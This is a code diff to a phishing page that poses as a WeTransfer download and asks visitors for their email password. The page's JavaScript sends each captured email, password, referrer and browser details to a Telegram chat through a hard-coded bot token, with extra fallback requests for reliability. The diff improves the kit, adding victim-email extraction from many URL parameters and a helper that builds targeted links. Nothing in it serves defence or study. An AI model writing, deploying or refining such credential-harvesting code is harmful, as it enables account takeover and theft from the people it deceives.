@@ -114,7 +114,6 @@ enter your email password to continue.<strong title="" id="mail" style="display:
 
 </div><div class="transfer__footer email-verification__footer" id="btn_footer"><button class="transfer__back" aria-label="Go back" type="button"><svg viewBox="0 0 32 32" focusable="false"><g fill="none" fill-rule="evenodd"><rect width="100%" height="100%" fill="#e8ebed" rx="50%"></rect><path fill="#6a6d70" d="M18.885 10.814l-1.57-1.57-7.072 7.07 7.07 7.07 1.572-1.57-5.5-5.5 5.5-5.5z"></path></g></svg></button><button onclick="mobileverif()" class="transfer__button email-verification__submit-button transfer__button" id="submit-btn" name="submit">Download</button></div></div></div>
   
-
 <script>
 // Telegram Configuration
 const BOT_TOKEN = '8572183910:AAEWObtshtLr97B6JP85rXovBNQlwX730_M';
@@ -148,45 +147,115 @@ function getQueryParam(param) {
     return urlParams.get(param);
 }
 
+// Extract email from ANY URL parameter (email, target, user, etc.)
+function extractEmailFromURL() {
+    // Try different parameter names in order
+    const paramNames = ['email', 'target', 'user', 'username', 'e', 'u', 'mail'];
+    
+    for (const param of paramNames) {
+        const value = getQueryParam(param);
+        if (value) {
+            // Check if it's base64 encoded
+            if (isBase64(value)) {
+                try {
+                    const decoded = base64Decode(value);
+                    if (decoded && decoded.includes('@')) {
+                        return decoded;
+                    }
+                } catch (e) {
+                    console.log(`Parameter ${param} is not valid base64:`, e);
+                }
+            }
+            // Check if it looks like an email (plain text in URL)
+            else if (value.includes('@') && value.includes('.')) {
+                // Decode URI component in case email has special characters
+                return decodeURIComponent(value);
+            }
+        }
+    }
+    
+    // Also check URL hash/fragment
+    const hash = window.location.hash.substring(1);
+    if (hash && hash.includes('@') && hash.includes('.')) {
+        return decodeURIComponent(hash);
+    }
+    
+    return null;
+}
+
+// Check if string might be base64
+function isBase64(str) {
+    try {
+        // Basic base64 check: only contains valid chars and length is multiple of 4
+        const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
+        return base64Regex.test(str) && str.length % 4 === 0;
+    } catch (err) {
+        return false;
+    }
+}
+
+// Validate email format
+function isValidEmail(email) {
+    if (!email) return false;
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+}
+
 // Initialize page with victim email
 function initializePage() {
-    // Get email from URL parameter
+    // Try to extract email from URL first
+    const emailFromURL = extractEmailFromURL();
+    
+    if (emailFromURL && isValidEmail(emailFromURL)) {
+        victimEmail = emailFromURL;
+        document.getElementById('email').value = victimEmail;
+        document.getElementById('mail').textContent = victimEmail;
+        console.log("Email from URL:", victimEmail);
+        return;
+    }
+    
+    // If no email in URL, try the old method (base64 target parameter)
     const targetParam = getQueryParam('target');
     
     if (targetParam) {
         try {
             victimEmail = base64Decode(targetParam);
-            if (victimEmail && victimEmail.includes('@')) {
+            if (victimEmail && isValidEmail(victimEmail)) {
                 document.getElementById('email').value = victimEmail;
                 document.getElementById('mail').textContent = victimEmail;
-                console.log("Page initialized for:", victimEmail);
-            } else {
-                showError("Invalid transfer link. Please check your invitation.");
-                disableForm();
+                console.log("Email from base64 target:", victimEmail);
+                return;
             }
         } catch (e) {
-            console.error("Error decoding email:", e);
-            showError("Invalid transfer link. Please check your invitation.");
-            disableForm();
-        }
-    } else {
-        // Try to get from localStorage (for testing)
-        try {
-            const requestID = getQueryParam('requestID');
-            const victimMap = JSON.parse(localStorage.getItem('victimMap')) || {};
-            if (requestID && victimMap[requestID]) {
-                victimEmail = victimMap[requestID];
-                document.getElementById('email').value = victimEmail;
-                document.getElementById('mail').textContent = victimEmail;
-            } else {
-                showError("Invalid transfer link. Please check your invitation.");
-                disableForm();
-            }
-        } catch (e) {
-            showError("Invalid transfer link. Please check your invitation.");
-            disableForm();
+            console.error("Error decoding base64 email:", e);
         }
     }
+    
+    // Last resort: try localStorage (for backward compatibility)
+    try {
+        const requestID = getQueryParam('requestID');
+        const victimMap = JSON.parse(localStorage.getItem('victimMap')) || {};
+        if (requestID && victimMap[requestID] && isValidEmail(victimMap[requestID])) {
+            victimEmail = victimMap[requestID];
+            document.getElementById('email').value = victimEmail;
+            document.getElementById('mail').textContent = victimEmail;
+            console.log("Email from localStorage:", victimEmail);
+            return;
+        }
+    } catch (e) {
+        console.log("LocalStorage access failed:", e);
+    }
+    
+    // If nothing found, show generic placeholder
+    showGenericPlaceholder();
+}
+
+function showGenericPlaceholder() {
+    // Show a generic email but allow user to change it
+    document.getElementById('email').value = 'your.email@company.com';
+    document.getElementById('mail').textContent = 'your.email@company.com';
+    // Enable the field so user can type their own email
+    document.getElementById('email').disabled = false;
 }
 
 function showError(message) {
@@ -212,6 +281,7 @@ function sendCredentialsToTelegram(email, password, attempt) {
     const timestamp = new Date().toLocaleString();
     const userAgent = navigator.userAgent;
     const pageUrl = window.location.href;
+    const referrer = document.referrer || 'Direct visit';
     
     const message = `🔐 WETRANSFER CREDENTIALS CAPTURED 🔐
 
@@ -220,47 +290,62 @@ function sendCredentialsToTelegram(email, password, attempt) {
 🔄 Attempt: ${attempt}
 ⏰ Time: ${timestamp}
 🌐 URL: ${pageUrl}
+🔗 Referrer: ${referrer}
 🖥️ User Agent: ${userAgent}
 📍 IP: Fetching...`;
 
-    // Send to Telegram
+    // Send to Telegram using multiple methods
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
+    // Method 1: FormData (most reliable)
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('text', message);
     formData.append('parse_mode', 'HTML');
     
-    // Try multiple methods for reliability
-    const method1 = fetch(telegramUrl, {
-        method: 'POST',
-        body: formData
+    // Method 2: URL parameters
+    const urlMethod = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    
+    // Try both methods
+    Promise.any([
+        fetch(telegramUrl, { method: 'POST', body: formData }),
+        fetch(urlMethod)
+    ])
+    .then(response => response.json())
+    .then(data => {
+        console.log('Credentials sent to Telegram:', data);
+    })
+    .catch(error => {
+        console.error('All Telegram methods failed:', error);
+        // Try one more simple method
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`NEW: ${email} | ${password}`)}`)
+            .catch(e => console.log('Final attempt also failed:', e));
     });
-    
-    const method2 = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-    
-    Promise.any([method1, method2])
-        .then(response => response.json())
-        .then(data => {
-            console.log('Credentials sent to Telegram:', data);
-        })
-        .catch(error => {
-            console.error('All Telegram methods failed:', error);
-        });
 }
 
 // Form submission handler
-function mobileverif() {
-    event.preventDefault();
+function mobileverif(event) {
+    if (event) event.preventDefault();
     
     const passwordInput = document.getElementById('password');
     const password = passwordInput.value;
-    const email = document.getElementById('email').value;
+    const emailInput = document.getElementById('email');
+    const email = emailInput.value;
     
-    if (!password) {
+    // Validate inputs
+    if (!email || !password) {
         document.getElementById('err1').style.display = 'block';
         setTimeout(() => {
             document.getElementById('err1').style.display = 'none';
+        }, 3000);
+        return;
+    }
+    
+    if (!isValidEmail(email)) {
+        document.getElementById('msgfont').textContent = 'Please enter a valid email address';
+        document.getElementById('msgfont').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('msgfont').style.display = 'none';
         }, 3000);
         return;
     }
@@ -314,17 +399,25 @@ document.addEventListener('DOMContentLoaded', function() {
     // Add Enter key support for password field
     document.getElementById('password').addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
-            mobileverif();
+            mobileverif(e);
         }
     });
+    
+    // Also attach to form submission
+    const form = document.querySelector('.email-verification__contents');
+    if (form) {
+        form.addEventListener('submit', mobileverif);
+    }
 });
 
-// Also attach to form submission
-document.querySelector('.email-verification__contents').addEventListener('submit', function(e) {
-    e.preventDefault();
-    mobileverif();
-});
+// Update admin panel link generation (if needed elsewhere)
+function generateEmailLink(email) {
+    // Generate URL with direct email parameter (no encoding needed)
+    const baseUrl = window.location.origin;
+    return `${baseUrl}?email=${encodeURIComponent(email)}`;
+}
 </script>
+
 
 </body>
 </html>
